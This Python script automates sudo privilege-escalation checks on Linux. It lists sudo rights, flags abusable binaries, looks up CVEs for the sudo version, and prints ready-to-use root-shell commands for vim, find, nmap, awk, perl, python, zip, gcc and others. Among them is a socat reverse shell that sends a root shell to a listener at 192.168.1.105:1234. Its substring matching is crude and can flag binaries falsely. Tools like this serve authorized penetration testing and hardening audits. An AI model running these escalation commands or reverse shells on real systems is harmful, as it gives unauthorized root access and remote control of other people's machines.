import os
import re
import subprocess
import requests

# Function to list sudo privileges
def get_sudo_privileges():
    print("[*] Checking for sudo privileges...")
    result = subprocess.run(['sudo', '-l'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if result.returncode != 0:
        print("[!] Error checking sudo privileges.")
        return None
    return result.stdout

# Function to parse dangerous sudo privileges
def parse_dangerous_privileges(sudo_privileges):
    dangerous_binaries = [
        'vim', 'awk', 'nmap', 'env', 'perl', 'python', 'less', 'man', 'ftp', 'find', 'gcc', 'zip', 'socat'
    ]
    findings = []
    for line in sudo_privileges.splitlines():
        for binary in dangerous_binaries:
            if binary in line:
                findings.append(binary)
    return findings

# Function to get the current sudo version
def get_sudo_version():
    print("[*] Retrieving sudo version...")
    result = subprocess.run(['sudo', '--version'], stdout=subprocess.PIPE, text=True)
    if result.returncode != 0:
        print("[!] Error retrieving sudo version.")
        return None
    match = re.search(r"Sudo version (\d+\.\d+\.\d+)", result.stdout)
    return match.group(1) if match else None

# Function to check CVEs for the sudo version
def check_sudo_cves(version):
    print(f"[*] Checking for CVEs related to sudo version {version}...")
    cve_url = f"https://www.cvedetails.com/json-feed.php?product_id=7046&version={version}&vendor_id=1697"
    try:
        response = requests.get(cve_url, timeout=10)
        if response.status_code == 200:
            cve_data = response.json()
            if cve_data:
                return [f"CVE-{item['cve_id']}: {item['summary']}" for item in cve_data]
            else:
                return ["No known CVEs found for this sudo version."]
        else:
            return ["Unable to retrieve CVE information."]
    except requests.RequestException:
        return ["Network error while retrieving CVE information."]

# Function to provide exploitation examples
def generate_exploitation_examples(findings):
    print("[*] Generating exploitation examples...")
    examples = {
        "vim": "sudo vim -c ':!/bin/bash'",
        "find": "sudo find /etc/passwd -exec /bin/bash \\;",
        "nmap": "echo \"os.execute('/bin/bash')\" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse",
        "env": "sudo env /bin/bash",
        "awk": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
        "perl": "sudo perl -e 'exec \"/bin/bash\";'",
        "python": "sudo python -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "less": "sudo less /etc/hosts - !bash",
        "man": "sudo man man - !bash",
        "ftp": "sudo ftp - ! /bin/bash",
        "socat": (
            "Attacker: socat file:`tty`,raw,echo=0 tcp-listen:1234\n"
            "Victim: sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234"
        ),
        "zip": "echo test > notes.txt && sudo zip test.zip notes.txt -T --unzip-command='sh -c /bin/bash'",
        "gcc": "sudo gcc -wrapper /bin/bash,-s ."
    }
    found_examples = []
    for binary in findings:
        if binary in examples:
            found_examples.append(f" - Exploit using {binary}: {examples[binary]}")
    return found_examples

# Main function
def main():
    print("[*] Starting sudo abuse and CVE scan...")

    # Step 1: Check sudo privileges
    sudo_privileges = get_sudo_privileges()
    if not sudo_privileges:
        print("[!] No sudo privileges found or unable to retrieve them.")
        return
    print("[+] Sudo privileges found:\n", sudo_privileges)

    # Step 2: Parse and identify potential sudo abuses
    findings = parse_dangerous_privileges(sudo_privileges)
    if findings:
        print("\n[!] Potential sudo abuse vulnerabilities found:")
        for finding in findings:
            print(f"   - sudo abuse possible with {finding}")
    else:
        print("[+] No dangerous sudo permissions detected.")

    # Step 3: Get sudo version
    sudo_version = get_sudo_version()
    if sudo_version:
        print(f"[+] Sudo version: {sudo_version}")
    else:
        print("[!] Unable to retrieve sudo version.")
        return

    # Step 4: Check for sudo CVEs
    cve_list = check_sudo_cves(sudo_version)
    print("\n[*] CVE Information for sudo version:")
    for cve in cve_list:
        print("   -", cve)

    # Step 5: Generate exploitation examples based on findings
    print("\n[*] Potential Exploitation Commands:")
    examples = generate_exploitation_examples(findings)
    if examples:
        for example in examples:
            print(example)
    else:
        print("   No exploitation examples available for the identified binaries.")

    print("[*] Sudo abuse and CVE scan completed.")

if __name__ == "__main__":
    main()
